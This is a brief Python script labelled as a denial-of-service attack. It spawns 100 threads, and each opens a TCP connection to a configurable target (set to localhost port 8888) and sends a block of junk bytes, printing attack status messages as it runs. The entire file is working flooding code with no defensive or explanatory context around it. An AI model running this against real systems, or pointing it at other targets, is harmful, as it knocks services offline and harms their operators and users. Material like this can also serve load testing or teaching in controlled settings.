import socket
import threading

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
THREADS = 100  # Number of concurrent threads
PAYLOAD_SIZE = 1024  # Large payload

def attack():
    """Single thread attack function."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_IP, TARGET_PORT))
        s.sendall(b"A" * PAYLOAD_SIZE)  # Large payload
        s.close()
    except:
        pass

def dos():
    print("[*] Starting DoS attack...")
    threads = []
    
    for _ in range(THREADS):
        t = threading.Thread(target=attack)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[*] Attack complete.")

if __name__ == "__main__":
    dos()
